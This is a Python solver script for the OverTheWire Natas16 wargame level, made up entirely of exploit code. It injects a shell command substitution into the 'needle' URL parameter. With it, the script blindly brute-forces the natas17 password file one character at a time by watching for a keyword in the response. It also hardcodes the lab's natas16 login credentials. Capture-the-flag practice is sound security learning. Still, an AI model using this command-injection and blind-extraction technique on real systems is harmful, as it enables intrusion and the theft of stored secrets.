import string
import requests


url = "http://natas16.natas.labs.overthewire.org/index.php?debug&needle="
password = ""
candidates = f"{string.ascii_letters}{string.digits}"

query = "acknowledgements$(grep ^{} /etc/natas_webpass/natas17)"
for _ in range(32):
    for c in candidates:
        resp = requests.get(
            url + query.format(password + c),
            auth=("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"),
        )
        if "acknowledgements" not in resp.text:
            password += c
            print(password)
            break
